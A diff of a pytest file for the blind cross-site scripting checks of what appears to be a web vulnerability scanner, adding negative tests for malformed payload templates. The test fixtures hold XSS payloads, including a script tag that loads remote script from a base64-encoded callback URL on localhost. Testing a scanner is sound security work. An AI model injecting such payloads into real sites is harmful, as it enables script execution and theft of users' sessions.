@@ -1,5 +1,6 @@
 import pytest
 from ava.blinds.xss import CrossSiteScriptingBlindDirectCheck, CrossSiteScriptingBlindDynamicCheck
+from ava.common.exception import InvalidFormatException
 
 
 class TestCrossSiteScriptingBlindDirectCheck:
@@ -18,10 +19,15 @@ class TestCrossSiteScriptingBlindDirectCheck:
     def test_init(self, check):
         assert check._payloads == self.payloads
 
-    def test_check_payloads(self, check):
+    def test_check_payloads_positive(self, check):
         payloads = ['<img src="{}">']
         correct = ['<img src="http://localhost:8080/">']
         assert correct == check._check_payloads(payloads)
+
+    def test_check_payloads_negative(self, check):
+        payloads = ['Invalid payload']
+        with pytest.raises(InvalidFormatException):
+            check._check_payloads(payloads)
 
 
 class TestCrossSiteScriptingBlindDynamicCheck:
@@ -51,8 +57,12 @@ class TestCrossSiteScriptingBlindDynamicCheck:
         test = check._payloads
         assert test == generated
 
-    def test_check_payloads(self, check):
+    def test_check_payloads_positive(self, check):
         payloads = ["<script>{}</script>"]
         correct = ["<script>s=document.createElement('script');s.src=atob('aHR0cDovL2xvY2FsaG9zdDo4MDgwLw==');document.head.appendChild(s);</script>"]
         assert correct == check._check_payloads(payloads)
 
+    def test_check_payloads_negative(self, check):
+        payloads = ['Invalid payload']
+        with pytest.raises(InvalidFormatException):
+            check._check_payloads(payloads)
